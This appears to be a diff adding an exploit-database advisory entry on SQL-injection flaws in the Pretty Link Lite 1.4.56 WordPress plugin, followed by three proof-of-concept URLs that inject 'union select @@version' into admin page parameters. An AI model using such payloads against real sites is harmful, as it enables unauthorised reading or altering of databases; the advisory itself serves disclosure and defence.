@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/48469/info
+
+The 'Pretty Link Lite' plugin for WordPress is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Pretty Link Lite 1.4.56 is vulnerable; prior versions may also be affected.
+
+http://www.example.com/wp-admin/admin.php?page=pretty-link/prli-clicks.php&group=-1union
+select @@version
+http://www.example.com.com/wp-admin/admin.php?page=pretty-link/prli-clicks.php&l=-1union
+select @@version
+http://www.example.com/wp-admin/admin.php?page=pretty-link/prli-links.php&group=-1union
+select @@version 
